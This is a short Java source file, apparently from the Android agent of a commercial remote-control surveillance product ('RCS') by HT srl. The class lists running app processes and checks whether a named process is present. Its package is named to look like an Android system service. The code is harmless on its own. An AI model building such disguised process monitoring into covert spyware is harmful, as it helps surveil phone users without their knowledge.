/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : RunningProcesses.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service;

import java.util.ArrayList;
import java.util.Iterator;

import android.app.ActivityManager;
import android.content.Context;
import android.util.Log;

import com.android.service.auto.Cfg;
import com.android.service.util.Check;
import com.android.service.util.Utils;

public class RunningProcesses {
	private static final String TAG = "RunningProcess";

	private ArrayList<ActivityManager.RunningAppProcessInfo> list;
	private ActivityManager activityManager;
	private long time;

	public RunningProcesses() {

		activityManager = (ActivityManager) Status.getAppContext().getSystemService(Context.ACTIVITY_SERVICE);
	}

	private void clear() {
		if (list != null) {
			list.clear();
		}
	}

	public void update() {
		Check.requires(activityManager != null, "Null activityManager");

		clear();

		list = (ArrayList<ActivityManager.RunningAppProcessInfo>) activityManager.getRunningAppProcesses();
		time = System.currentTimeMillis();
	}

	// DEBUG
	public void print() {
		if (list == null || list.size() == 0)
			return;

		Iterator<ActivityManager.RunningAppProcessInfo> iter = list.listIterator();

		while (iter.hasNext()) {
			ActivityManager.RunningAppProcessInfo element = iter.next();

			if(Cfg.DEBUG) Log.d("QZ", TAG + " (update) proc: " + element.processName);
		}
	}

	public synchronized boolean isPresent(String process) {

		if (list == null || list.size() == 0)
			return false;

		Iterator<ActivityManager.RunningAppProcessInfo> iter = list.listIterator();

		if (process.length() == 0)
			return false;

		while (iter.hasNext()) {
			ActivityManager.RunningAppProcessInfo element = iter.next();

			if (Utils.matchStar(process, element.processName) == true)
				return true;
		}

		return false;
	}

	public synchronized ArrayList<ActivityManager.RunningAppProcessInfo> getProcessList() {
		return list;
	}
}
